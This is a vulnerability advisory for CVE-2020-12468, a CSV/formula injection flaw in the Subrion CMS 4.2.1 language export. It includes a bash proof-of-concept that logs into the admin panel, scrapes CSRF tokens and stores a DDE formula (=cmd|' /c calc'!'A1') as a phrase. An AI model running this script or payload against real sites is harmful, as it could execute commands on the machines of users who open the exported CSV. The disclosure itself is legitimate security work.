# Export Language - CSV Injection (aka Excel Macro Injection or Formula Injection)

## VulDB-Like Summary

A vulnerability has been found in the Subrion CMS 4.2.1. It has been rated as problematic. Affected by this issue is an unknown code. The manipulation of the of a phrase value within a language leads to a CSV Injection vulnerability. Using CWE to declare the problem leads to CWE-1236. Impacted is confidentiality. An attacker might be able inject script and macros inside CSVs, and using them to mount further attacks against other users.

The weakness was presented 04/12/2020 by Alessandro Magnosi (deadc0de) (GitHub Repository). The advisory is shared for download at github.com. This vulnerability is handled as CVE-2020-12468. The attack may be launched remotely. A single form of authentication is required for exploitation. Technical details are known but no exploit is publicly available.

## Proof-of-Concept

The following script may be used to easily verify the vulnerability:

```bash
#!/bin/bash

username="admin"
password="Passw0rd!"
target="http://subrion.local/panel/"
proxy="http://127.0.0.1:8080"

# Grep Session Cookie Name
sess_cookie_name=$(curl -ks -x $proxy $target -I | grep "Set-Cookie" | head -n 1 | grep -oP "INTELLI_\w*")
cookies="Cookie: loader=loaded; $sess_cookie_name=00000000000000000000000000"
# Grep CSRF Token
csrf_token=$(curl -ks -x http://127.0.0.1:8080 $target | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
echo "[*] Logging in"
# Fix the Session Cookie Value and login
res=$(curl -ks -x $proxy $target -X POST --data "__st=$csrf_token&username=$username&password=$password" -H "$cookies" -i | grep "Set-Cookie")

echo "[*] Adding evil phrase"
# Get CSRF Token to ADD a phrase
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/phrases/add/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Add the crafted parameter
res=$(curl -ksi -x "$proxy" -X "POST" -H "$cookies" --data-binary "__st=$csrf_token&key=_csv_injection_&category=common&module=&value%5Ben%5D=%2C%3Dcmd%7C%27+%2Fc+calc%27%21%27A1%27%2C&save=1&goto=list"  "$target/phrases/add/")
if [[ $(echo $res | grep "HTTP/1.1" | grep 302) == "" ]]; then
    echo "Could not add the evil phrase"
    exit 1
fi
echo "[*] Downloading Language"
# Get CSRF Token to Download
csrf_token=$(curl -i -s -k -H "$cookies" -x $proxy "$target/languages/download/" | grep "__st" | grep -oP "value=\"\K([a-zA-Z0-9]*)" | head -n 1)
# Downloading the file, showing the issue
curl -ks -x $proxy -X "POST" -H "$cookies" --data-binary "__st=$csrf_token&lang=en&file_format=csv&filename=subrion_4.2.1_en" "$target/languages/download/" | grep "_csv_injection_"
```

Using the above script should give the following output, proving the vulnerability.

```
$ ./csv_injection.sh
[*] Logging in
[*] Adding evil phrase
[*] Downloading Language
_csv_injection_|",=cmd|' /c calc'!'A1',"|",=cmd|' /c calc'!'A1',"|common|en||0
```

As it may be noticed, the value `=cmd|' /c calc'!'A1'` is treated as a standalone cell, wrapped between two commas. If opened in Microsoft Excel, a calculator would spawn.

## Remediation

Currently, no fixes are available for this issue.

## References

*   [https://cwe.mitre.org/data/definitions/1236.html](https://cwe.mitre.org/data/definitions/1236.html)
*   [https://owasp.org/www-community/attacks/CSV_Injection](https://owasp.org/www-community/attacks/CSV_Injection)
*   [https://vel.joomla.org/articles/2140-introducing-csv-injection](https://vel.joomla.org/articles/2140-introducing-csv-injection)



 
